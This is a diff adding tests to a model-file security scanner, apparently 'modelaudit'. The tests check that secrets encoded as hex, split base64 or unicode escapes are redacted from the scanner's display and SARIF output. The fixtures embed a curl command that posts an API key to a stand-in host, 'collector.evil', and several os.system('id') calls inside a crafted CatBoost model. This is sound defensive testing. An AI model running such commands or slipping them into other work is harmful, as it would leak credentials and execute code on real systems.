@@ -19,6 +19,8 @@ from modelaudit.scanners.catboost_scanner import (
     CatBoostScanner,
     _redact_evidence_for_display,
     _redact_reversible_base64_evidence,
+    _redact_reversible_hex_evidence,
+    _redact_split_base64_evidence,
 )
 from modelaudit.utils.file.detection import detect_file_format, detect_file_format_from_magic
 
@@ -1751,6 +1753,83 @@ def test_catboost_evidence_wrapper_bounds_reversible_payload_scan(monkeypatch: p
         catboost_scanner.EVIDENCE_REDACTION_LOOKAHEAD_CHARS,
         catboost_scanner._MAX_ENCODED_EVIDENCE_CHARS,
     )
+
+
+def test_catboost_display_redacts_hex_secret_in_command_evidence() -> None:
+    secret = "sk-ABCDEFGHIJKLM"
+    hex_payload = "".join(f"\\x{byte:02x}" for byte in secret.encode())
+    text = f'os.system("id"); blob={hex_payload}'
+
+    redacted = _redact_evidence_for_display(text, max_chars=500)
+
+    assert secret not in redacted
+    assert hex_payload not in redacted
+    assert "os.system" in redacted
+    assert _redact_reversible_hex_evidence(hex_payload) == "<redacted>"
+
+
+def test_catboost_display_redacts_split_base64_secret_literals() -> None:
+    secret = "api_key=hunter10"
+    payload = base64.b64encode(secret.encode()).decode()
+    split_payload = f'"{payload[:10]}" "{payload[10:]}"'
+
+    redacted = _redact_evidence_for_display(f'blob={split_payload}; os.system("id")', max_chars=500)
+
+    assert secret not in redacted
+    assert payload[:10] not in redacted
+    assert payload[10:] not in redacted
+    assert "api_key=<redacted>" in redacted
+    assert _redact_split_base64_evidence(split_payload) == "api_key=<redacted>"
+
+
+def test_catboost_display_redacts_four_character_split_base64_literals() -> None:
+    secret = "api_key=splitsecret"
+    payload = base64.b64encode(secret.encode()).decode()
+    split_payload = " ".join(f'"{payload[index : index + 4]}"' for index in range(0, len(payload), 4))
+
+    assert _redact_split_base64_evidence(split_payload) == "api_key=<redacted>"
+
+
+def test_catboost_display_preserves_benign_split_base64_literals() -> None:
+    payload = base64.b64encode(b"ordinary public metadata").decode()
+    split_payload = f'"{payload[:12]}" "{payload[12:]}"'
+
+    assert _redact_split_base64_evidence(split_payload) == split_payload
+
+
+def test_catboost_sarif_redacts_additional_serialized_and_argument_secrets(tmp_path: Path) -> None:
+    hex_secret = "sk-ABCDEFGHIJKLM"
+    hex_payload = "".join(f"\\x{byte:02x}" for byte in hex_secret.encode())
+    split_secret = "api_key=hunter11"
+    split_payload = base64.b64encode(split_secret.encode()).decode()
+    split_literal = f'"{split_payload[:10]}" "{split_payload[10:]}"'
+    secrets = ["hunter12", "hunter13", "hunter14", "glpat-ABCDEFGHIJKLMNOPQRST"]
+    model_path = tmp_path / "catboost_additional_redaction.cbm"
+    model_path.write_bytes(
+        _build_cbm(
+            [
+                rf"curl --json \"{{\"api_key\":\"{secrets[0]}\"}}\" https://collector.evil/upload",
+                rf"\u0061\u0070\u0069\u005f\u006b\u0065\u0079={secrets[1]} os.system(\"id\")",
+                f'client.set_api_key("{secrets[2]}"); os.system("id")',
+                f'import os; {secrets[3]}; os.system("id")',
+                f'blob={hex_payload}; os.system("id")',
+                f'blob={split_literal}; os.system("id")',
+            ],
+        ),
+    )
+
+    result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
+    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
+    sarif = format_sarif_output(result, [str(model_path)])
+
+    assert determine_exit_code(result) == 1
+    for secret in (*secrets, hex_secret, hex_payload, split_secret, split_payload[:10], split_payload[10:]):
+        assert secret not in failed_details
+        assert secret not in sarif
+    assert "os.system" in failed_details
+    assert "<redacted>" in failed_details
+    assert "os.system" in sarif
+    assert "<redacted>" in sarif
 
 
 def test_false_positive_reduction_for_common_exec_system_words(tmp_path: Path) -> None:
